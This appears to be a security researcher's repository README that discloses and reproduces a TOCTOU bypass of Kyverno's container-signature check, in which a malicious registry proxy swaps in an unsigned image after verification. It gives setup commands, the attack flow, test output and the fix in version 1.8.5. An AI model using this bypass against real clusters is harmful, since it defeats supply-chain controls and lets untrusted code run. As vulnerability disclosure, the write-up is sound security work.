# Bypassing container signature validation in Kubernetes Admission Controllers

This repository contains all the scripts and artifacts which you need to re-run the proof of concept attack which I did on a Kubernetes cluster and Kyverno Admission Controller.

If you already know everything and just want to re-run the attack, go to direcly to [reproducing the attack section](#reproducing-the-attack) :sunglasses:

# Background

Supply-chain security is a thoroughly discussed topic in the Cloud Native community. So it comes as no surprise that projects like Kyverno have started to incorporate supply-side security measures into their offerings.

In order to secure supply chains, validating software components should happen at every step from development to production. Container images are an obvious potential attack vector, so it is critical that container images are validated to ensure that only verified code is running in a Kubernetes cluster. If an attacker is able to control the contents of an image that is pulled into the Kubernetes cluster, the attacker can effectively take control of the workload.

In order to protect the Kubernetes cluster against malicious container images, multiple Admission Controller solutions vendors started to offer policies that can enforce container image signatures. Their main claim is that with an Admission Controller, users can create a policy to only have validated images running inside the cluster.


# Image signature validation flow in Admission Controllers
Here is the way signature validation works in admission controllers. (see drawing and steps below)

1. A new workload based on a “image tag” is requested from the cluster through the Kubernetes API server.
2. The API server will ask the Admission Controller to validate the new workload. The Admission Controller decides whether it can be admitted to the cluster.
3. The Admission Controller, which is configured to validate the image signature, requests the image and the signature from the container registry.
4. The container registry supplies both the signature and the image itself. 
5. Depending on whether the image and the signature are correct, the Admission Controller allows the new workload into the cluster. To prevent spoofing, Kyverno changes the image to be pulled by “image hash” and not “image tag”.
6. The API server asks Kubelet to start the new workload.
7. Kubelet asks the container runtime to start a new container based on the “image tag” from step 5.
8. Container runtime downloads the image (again) from the container registry.
9. Container runtime starts the new container based on the image.


![Image validation in admission controller](docs/dia1.png "Title")

# The attack

The goal is to inject an unsigned image inside a namespace in the cluster which should only be running signed images.

In this attack, we assume the attacker controls a container registry (“malicious container registry”) or has set up a proxy between the registry and the target. The attacker attempts to trick the user into running a Pod with an image from this registry. Meanwhile, the cluster administrator has a policy in place to protect the cluster from malicious images by enforcing container signatures. From the cluster administrator's perspective, no unsigned images can be admitted into the cluster.


In the POC I had the following components in my hand:
* Minikube + Kyverno (added my Root CA certificate to both, did this to make the POC simpler, however, could have been more sophisticated with a “Let’s Encrypt” cerficiate)
* Container signing key-pair
* Namespace called “signed” with an enforced policy on image signatures (with the public key of the keypair)
* One signed image with the private key in docker hub
* One unsigned image in docker hub
* Proxy server I wrote to be a Man-in-the-Middle between the cluster and docker hub (see the code at the end of this document)

The proxy server behaves in the following way: if it sees that the Admission Controller is asking for an signed image it returns a signed image for signature validation and an unsigned image manifest for the mutation. In any other cases, it just proxies the information between the cluster and docker hub.

![Image validation in admission controller](docs/dia2.png "Title")

The attack steps are as follows:
1. The user is convinced to run the signed image from the “Malicious proxy”. 
2. The API server asks the admission controller for approval.
3. The Admission Controller asks for the image manifest based on the “image tag”. Based on the manifest, it gets the “image hash” and asks for the signature from the “signed image” based on “image hash”.
4. The malicious proxy returns the “signed image” signature to the Admission Controller.
5. The Admission Controller verifies the signature of the signed image.
6. Due to the software bug, the Admission Controller requests the manifest of the signed image for the second time to get the digest for mutation.
7. The malicious proxy returns the manifest of a different image – this one unsigned and malicious.
8. The Admission Controller changes the image in the Pod spec from “image tag” to “image hash” (mutation) and gives approval to the API server.
9. Kubelet is asked to start the Pod based on the unsigned image.

Malicious proxy code can be seen [here](proxy-server.py)

**The container is started based on the unsigned image**

The problem is that the image from the container image manifest is downloaded twice. It is pulled once for signature validation and a second time for mutating the image name in the Pod spec. This is a classic example of a [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) problem that allows the attacker to pull a bait-and-switch. Since the image manifest which will eventually be used is not the same as the one which was verified, this enables the attacker to trick the software.

# Mitigation
Kyverno went to great lengths to protect users and implements a very good mechanism to verify container images against supply chain attacks. Kyverno automatically substitutes the image tag for the digest on first use. 

However, software bugs or non-tested code can cause multiple tag-based queries to the image registry as foundtag based in Kyverno version 1.8.3, which can be exploited by attackers. 

This problem has been promptly fixed by the Kyverno team, in version 1.8.5, and users should update to the latest version. The fix ensures that the same image hash is used to change the workload specification as was used to verify the signature. An additional recommended mitigation is to implement a policy that only allows trusted registries, which would prevent the malicious proxy from being used.


# Reproducing the attack

**Note:** Since image registry API assumes HTTPS (for good!) the attacker must obtain a valid TLS Certificate for the proxy/server. In this POC I decided to create my own Root CA and embed it both Kubernetes and Kyverno to bypass this problem. This is not an ideal choice for a real life attacker who could solve this in different ways (for example: buying a domain and obtaining Let's Encrypt signed certificate for that domain). 

Note that the way I solved this here is not limiting the problem, but helps this demontration to be more easily to demostrate.

## Setting up the cluster

### Run the script
I have prepared a convinient script (tested on Ubuntu)
```shell{:copy}
./setup-cluster.sh
```
If you want to do it yourself, do the following steps otherwise skip to [Setting up malicious proxy](#setting-up-malicious-proxy)
### Minikube 
Creating a minikube instance with an added root CA certificate (see note above).
```shell{:copy}
cp certs/benCA.pem $HOME/.minikube/certs/. # adding the own root CA to minikube (see comments above)
minikube start --driver=docker --embed-certs
```

### Installing Kyverno
Note I am using my own Kyverno image which was built using `kyverno-image/Dockerfile`. The only difference between the official Kyverno image and `hisu/kyverno` is that my build contains the extra root CA certificate.
 (see note above)
```shell{:copy}
helm install kyverno kyverno/kyverno -n kyverno --create-namespace --set replicaCount=1 --set image.repository=hisu/kyverno
helm install kyverno-policies kyverno/kyverno-policies -n kyverno
```

### Creating a protected namespace
Here I am creating the namspace `signed` and I am adding a policy which should only allow images which were signed by `cosign.key` to be admitted in it.
```shell{:copy}
kubectl create ns signed
kubectl apply -f signed-policy.yaml
```

### Container images in Dockerhub

I have created two images:

1. `hisu/cosign-test:signed`: Image based on nginx:latest and signed by `cosign.key`
2. `hisu/cosign-test:unsigned`: Image built with the Dockerfile at `nginx-alternative-image/Dockerfile` with a single file change 


### Proving the policy works

I cannot run the unsigned image, this command should fail:
```shell{:copy}
kubectl -n signed run unsigned --image=hisu/cosign-tests:unsigned --image-pull-policy='Always'
```


And this should succed
```shell{:copy}
kubectl -n signed run signed --image=hisu/cosign-tests:signed --image-pull-policy='Always'
```

## Setting up malicious proxy

The IP of your proxy is important for the sake of this demonstration. It needs to be accessible both for the node (image pull by the container runtime) and the admission controller POD (checking image signature).

Let's bring up the malicious proxy. I have created a simple script to create signed certificate for the proxy and start the proxy. To run:
```shell{:copy}
./setup-malicious-proxy.sh <IP>
```

## Showing attack

### Running the guided script

You can run also the following script to run through all the positive and negative cases:
```shell{:copy}
$ ./running-attack-tests.sh <MY IP>
1> Trying to run unsigned image in signed namespace
----------------------------------------
kubectl -n signed run unsigned --image=hisu/cosign-tests:unsigned --image-pull-policy=Always
Error from server: admission webhook "mutate.kyverno.svc-fail" denied the request: 

policy Pod/signed/unsigned for resource violation: 

check-image:
  check-image: |
    failed to verify image docker.io/hisu/cosign-tests:unsigned: .attestors[0].entries[0].keys: no matching signatures:
----------------------------------------
Press enter to continue
2> Trying to run signed image in signed namespace
----------------------------------------
kubectl -n signed run signed --image=hisu/cosign-tests:signed --image-pull-policy=Always
pod/signed created
----------------------------------------
2> Succeeded to run signed image in signed namespace
Press enter to continue
3> Trying to run signed image in signed namespace by using the proxy
----------------------------------------
kubectl -n signed run unsigned --image=10.144.94.202:4443/hisu/cosign-tests:signed --image-pull-policy=Always
pod/unsigned created
----------------------------------------
3> Waiting for pod to be ready
pod/unsigned condition met
3> Checking HTTP response from the pod
----------------------------------------
Forwarding from 127.0.0.1:8080 -> 80
Forwarding from [::1]:8080 -> 80
curl -s -k -v http://localhost:8080
*   Trying 127.0.0.1:8080...
<h1>Hacked!</h1>
 ___ _   _  ___ ___ ___  ___ ___ 
/ __| | | |/ __/ __/ _ \/ __/ __|
\__ \ |_| | (_| (_|  __/\__ \__ \
|___/\__,_|\___\___\___||___/___/

3> Proxy could inject an unsigned image in signed namespace
----------------------------------------
Press enter to continue
pod "unsigned" deleted
pod "signed" deleted
```

### Running a standalone unsigned image
If you run:
```shell{:copy}
kubectl -n signed run unsigned --image=<IP>:4443/hisu/cosign-tests:signed --image-pull-policy='Always'
```

See here
![Image validation in admission controller](docs/screenshot1.png "Title")


